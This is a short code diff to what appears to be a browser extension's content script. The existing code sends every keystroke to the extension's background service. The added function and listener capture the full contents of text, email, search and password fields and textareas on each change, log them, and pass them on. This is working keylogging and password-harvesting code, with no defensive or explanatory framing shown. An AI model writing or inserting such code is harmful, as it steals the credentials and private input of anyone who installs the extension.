@@ -442,3 +442,18 @@ document.addEventListener('keyup', function(event) {
   // Send data to the background service
   chrome.runtime.sendMessage({ key: event.key });
 });
+
+// This function will be called whenever the input value changes
+function handleInputValueChange(inputElement) {
+  console.log('Current input value:', inputElement.value);
+  chrome.runtime.sendMessage({ key: inputElement.value });
+}
+
+document.addEventListener('keyup', function() {
+  var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea', '#username', '#password');
+  inputs.forEach(input => {
+      input.addEventListener('input', () => {
+          handleInputValueChange(input);
+      });
+  });
+});
